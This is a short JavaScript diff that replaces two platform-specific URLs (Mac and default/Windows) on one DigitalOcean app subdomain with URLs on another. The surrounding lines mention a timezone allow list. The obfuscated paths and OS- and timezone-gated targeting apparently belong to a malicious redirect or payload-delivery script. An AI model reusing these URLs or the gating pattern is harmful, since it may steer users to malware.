@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://ale-app-7sawe.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://ale-app-7sawe.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    mac: "https://oyster-app-fh6qy.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://oyster-app-fh6qy.ondigitalocean.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
